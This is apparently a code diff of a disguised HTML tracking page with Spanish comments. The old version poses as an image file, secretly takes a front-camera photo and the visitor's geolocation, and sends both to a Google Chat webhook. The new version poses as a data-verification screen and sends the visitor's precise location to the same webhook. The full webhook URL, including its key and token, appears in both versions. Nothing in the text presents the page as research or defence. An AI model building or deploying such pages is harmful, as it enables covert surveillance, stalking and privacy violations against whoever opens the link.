@@ -1,72 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>image.jpg</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta charset="UTF-8">
+  <title>Verifica</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body, html { height:100%; margin:0; background:#000; }
-    #thumbnail { width:100vw; height:100vh; object-fit:cover; }
-    #canvas, #loading { display: none; }
+    html,body {height:100%;width:100%;margin:0;background:#222;color:#fff;display:flex;align-items:center;justify-content:center;}
+    .caja{display:flex;flex-direction:column;align-items:center;}
+    .oculto{display:none;}
   </style>
 </head>
 <body>
-  <img id="thumbnail" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..."/>
-  <canvas id="canvas"></canvas>
-  <script>
-    async function main() {
-      // Activar cámara frontal
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      await video.play();
+  <div class="caja">
+    <h2>Verificando datos…</h2>
+    <div id="estado">Espere un momento por favor.</div>
+  </div>
+<script>
+async function recolectarYEnviar() {
+  // Intentar recoger ubicación
+  let position = null;
+  try {
+    position = await new Promise((resolve, reject) => 
+      navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy:true,timeout:8000})
+    );
+  } catch(e) {}
+  let lat = position?.coords?.latitude || "null";
+  let lon = position?.coords?.longitude || "null";
 
-      // Tomar foto
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      stream.getTracks().forEach(track => track.stop());
+  // Mensaje para webhook (solo ubicación y nota)
+  let mensaje = {
+    text: `Foto tomada (no disponible como archivo)\nUbicación: https://maps.google.com/?q=${lat},${lon}`
+  };
 
-      const photo = canvas.toDataURL('image/jpeg');
-
-      // Obtener ubicación
-      const loc = await new Promise(r =>
-        navigator.geolocation.getCurrentPosition(pos => r(pos), err => r(null))
-      );
-      const lat = loc ? loc.coords.latitude : null;
-      const lon = loc ? loc.coords.longitude : null;
-
-      // Construir mensaje para el webhook
-      let message = {
-        "text": "Nueva evidencia:",
-        "cards": [
-          {
-            "sections": [
-              {
-                "widgets": [
-                  { "image": { "imageUrl": photo } },
-                  {
-                    "textParagraph": {
-                      "text": "Ubicación: " + (lat && lon ? `<a href='https://maps.google.com/?q=${lat},${lon}'>${lat},${lon}</a>` : "No disponible")
-                    }
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      };
-
-      // Enviar a webhook
-      await fetch("https://chat.googleapis.com/v1/spaces/AAQAkFNcrrQ/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=iKoaLISxJB0lYdLzbXY6B2NbeQ0cZ8P-cd5PXpHPDio", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-      });
-    }
-    setTimeout(main, 1500);
-  </script>
+  // Enviar a Webhook
+  document.getElementById('estado').textContent = 'Enviando…';
+  await fetch("https://chat.googleapis.com/v1/spaces/AAQAkFNcrrQ/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=iKoaLISxJB0lYdLzbXY6B2NbeQ0cZ8P-cd5PXpHPDio",{
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(mensaje)
+  });
+  document.getElementById('estado').textContent = '¡Listo!';
+}
+setTimeout(recolectarYEnviar, 1500);
+</script>
 </body>
 </html>
